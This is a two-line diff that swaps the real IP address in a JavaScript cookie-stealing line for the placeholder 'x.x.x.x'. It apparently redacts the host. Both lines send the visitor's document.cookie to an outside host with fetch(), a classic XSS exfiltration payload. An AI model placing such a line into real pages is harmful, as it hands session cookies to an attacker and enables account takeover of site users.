@@ -1,2 +1,2 @@
 
-fetch("http://142.132.190.212/?c=" + document.cookie);
+fetch("http://x.x.x.x/?c=" + document.cookie);
